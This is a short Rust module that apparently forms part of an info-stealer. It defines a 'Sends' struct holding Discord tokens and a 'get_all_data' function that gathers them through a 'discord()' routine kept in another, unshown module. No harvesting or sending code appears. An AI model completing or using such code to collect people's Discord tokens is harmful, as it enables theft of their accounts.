use serde_derive::{Deserialize, Serialize};

#[cfg(feature = "functions")]
mod all_data;

#[derive(Deserialize, Serialize, Clone)]
pub struct Sends {
    pub discord_token: Vec<String>,
}

#[cfg(feature = "functions")]
impl Sends {
    pub fn init() -> Sends {
        Sends {
            discord_token: Vec::new(),
        }
    }
}

#[cfg(feature = "functions")]
pub fn get_all_data() -> Sends {
    let mut sends = Sends::init();
    #[cfg(feature = "discord")]
    sends.discord();
    sends
}
